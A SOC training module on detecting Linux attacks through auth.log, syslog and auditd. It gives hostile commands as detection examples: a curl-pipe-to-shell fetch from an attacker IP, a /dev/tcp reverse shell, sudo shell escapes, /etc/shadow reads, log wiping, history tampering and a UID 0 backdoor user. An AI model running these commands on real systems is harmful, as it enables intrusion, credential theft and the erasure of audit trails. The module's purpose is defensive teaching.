# Module 10: Linux Security Monitoring

> **Overview:** Linux powers the majority of cloud workloads, production web servers, and infrastructure appliances. This module covers Linux log files (`syslog`, `auth.log`, `auditd`), tracking Initial Access (SSH & Web exploits), detecting Privilege Escalation/Defense Evasion, and uncovering Linux Persistence mechanisms.

---

## Chapter 1: Linux Logging for SOC

### Core Linux Log Files (`/var/log/`)
| Log Path | Distro | What It Records |
| :--- | :--- | :--- |
| `/var/log/auth.log` | Debian / Ubuntu | Authentication events: SSH logins (`sshd`), `sudo` command executions, `su` user switches, `useradd`/`usermod`, `cron` pam sessions |
| `/var/log/secure` | RHEL / CentOS / Rocky | RedHat equivalent of `/var/log/auth.log` |
| `/var/log/syslog` or `/var/log/messages` | Ubuntu / RHEL | General system daemon logs, systemd service starts/stops, cron executions |
| `/var/log/kern.log` | Debian / Ubuntu | Kernel ring buffer messages, hardware events, `ufw`/`iptables` firewall packet drops, segfaults (exploit crashes!) |
| `/var/log/dpkg.log` / `/var/log/apt/history.log` | Debian / Ubuntu | Package installations and removals (`apt install nmap`) |
| `/var/log/wtmp` / `btmp` / `utmp` | All Linux | Binary login logs read via `last` (`wtmp` = login history), `lastb` (`btmp` = bad login attempts), and `who`/`w` (`utmp` = currently logged in) |
| `~/.bash_history` / `~/.zsh_history` | Per-User | Command history executed interactively by a user (written when the shell session closes) |

### Linux Audit Daemon (`auditd` — `/var/log/audit/audit.log`)
Standard `syslog` does **not** log every process execution (`execve`). To get Sysmon-equivalent process creation telemetry on Linux, SOCs deploy **`auditd`** (often paired with `Auditbeat` or `Sysmon for Linux`):
- **Key `auditd` Record Types:**
  - `type=SYSCALL`: Captures the system call (`syscall=59` is `execve`), `uid` (real user ID), `euid` (effective user ID — `euid=0` means running as `root`!), `ppid` (Parent PID), `pid`, `exe="/usr/bin/bash"`, and `key="suspicious_cmd"`.
  - `type=EXECVE`: Captures the exact command-line arguments (`argc`, `a0`, `a1`, `a2`).
  - `type=PROCTITLE`: Hex-encoded full command line (decode in CyberChef `From Hex` or via `ausearch -i`).
  - `type=PATH`: Captures the target file path, inode, and permissions accessed by the syscall.
- **Searching `auditd` Logs:**
  ```bash
  sudo ausearch -i -k privesc             # Search by rule key (-i decodes hex/UIDs to text)
  sudo ausearch -i -x /usr/bin/curl       # Search executions of a specific binary
  sudo aureport -x --summary              # Summary report of executed binaries
  ```

---

## Chapter 2: Linux Threat Detection 1 (Initial Access)

### 1. SSH Brute-Force vs. Successful Compromise (`/var/log/auth.log`)
- **Failed Password Attempts (Brute Force):**
  ```text
  Failed password for invalid user admin from 203.0.113.50 port 49212 ssh2
  Failed password for root from 203.0.113.50 port 49218 ssh2
  ```
- **Successful SSH Login (Password or Stolen SSH Key):**
  ```text
  Accepted password for ubuntu from 203.0.113.50 port 50112 ssh2
  Accepted publickey for root from 203.0.113.50 port 50199 ssh2: RSA SHA256:...
  ```

### 2. Web Service Exploitation & Process Trees
When an attacker exploits a web application (Command Injection, SSTI, Log4Shell, Deserialization) or database (`PostgreSQL COPY FROM PROGRAM`), the initial malicious commands run under the **service account** (`www-data`, `nginx`, `tomcat`, `postgres`):
- **Process Tree Anomaly in `auditd` / `ps auxf`:**
  - Parent Process: `/usr/sbin/apache2` or `python3 app.py` (`uid=33(www-data)`).
  - Child Process: `/bin/sh -c "curl http://10.10.14.5/linpeas.sh | sh"` or `bash -i >& /dev/tcp/...`.

---

## Chapter 3: Linux Threat Detection 2 (Privilege Escalation & Defense Evasion)

### Detecting Linux Privilege Escalation
1. **`sudo` Abuse (`/var/log/auth.log`):**
   - Look for `sudo -l` enumeration (`COMMAND=/usr/bin/sudo -l`) followed by GTFOBins abuse (e.g., `sudo vim -c ':!/bin/sh'`, `sudo find . -exec /bin/sh \;`, `sudo python3 -c 'import os; os.system("/bin/bash")'`).
   - Failed sudo attempts trigger: `user : user NOT in sudoers ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash`.
2. **SUID Binary Exploitation:**
   - Attackers search for SUID binaries (`find / -perm -4000 2>/dev/null`).
   - In `auditd` logs, look for a process where **Real UID is a normal user (`uid=1001`)** but **Effective UID becomes root (`euid=0`)** (`uid != euid`).
3. **Sensitive File Access (`/etc/shadow` & SSH Keys):**
   - Non-root users or unusual binaries (`cat`, `base64`, `cp`) reading `/etc/shadow` or `/root/.ssh/id_rsa`.

### Detecting Defense Evasion on Linux
- **History Tampering:**
  - Commands like `unset HISTFILE`, `export HISTSIZE=0`, `history -c`, `rm -f ~/.bash_history`, or `ln -s /dev/null ~/.bash_history`.
  - Starting a command with a leading space (`  whoami`) to evade history recording when `HISTCONTROL=ignorespace` is set.
- **Log Deletion / Truncation:**
  - `rm -rf /var/log/*`, `truncate -s 0 /var/log/auth.log`, or `echo "" > /var/log/syslog`.
- **Masquerading & Hidden Files:**
  - Naming malware `/tmp/.systemd-helper` (leading dot hides it from standard `ls`) or `/dev/shm/kworker` (executing in RAM-backed shared memory).
- **Timestomping:** Using `touch -r /bin/ls backdoor.sh` or `touch -t` to forge file modification timestamps.

---

## Chapter 4: Linux Threat Detection 3 (Persistence & C2)

### Common Linux Persistence Techniques & Locations
| Persistence Mechanism | File Paths / Logs to Inspect |
| :--- | :--- |
| **SSH `authorized_keys` (`T1098.004`)** | Attacker appends their public SSH key to `/root/.ssh/authorized_keys` or `/home/<user>/.ssh/authorized_keys` for passwordless SSH access |
| **Cron Jobs (`T1053.003`)** | Inspect `/etc/crontab`, `/etc/cron.d/*`, `/etc/cron.{hourly,daily,weekly,monthly}/*`, and `/var/spool/cron/crontabs/<user>` (and `/var/log/syslog` for `CRON[...] CMD (...)`) |
| **Systemd Services (`T1543.002`)** | Rogue `.service` files created in `/etc/systemd/system/` or `/lib/systemd/system/` executing reverse shells (`ExecStart=/bin/bash -c ...`) |
| **Shell Profile / RC Scripts (`T1546.004`)** | Commands appended to `/etc/profile`, `/etc/bash.bashrc`, `~/.bashrc`, or `~/.profile` (triggers every time a user opens a shell!) |
| **Backdoor `/etc/passwd` User (`T1136.001`)** | Adding a new user in `/etc/passwd` with **UID `0`** (`hacker:x:0:0:root:/root:/bin/bash`) or `useradd` in `/var/log/auth.log` |
| **LD_PRELOAD / Shared Library Hijacking (`T1574.006`)** | Malicious `.so` shared object added to `/etc/ld.so.preload` to hook system calls (`readdir`) and hide rootkit files/processes |
| **MOTD (Message of the Day) Backdoor** | Scripts inside `/etc/update-motd.d/` execute as `root` every time any user logs in via SSH! |
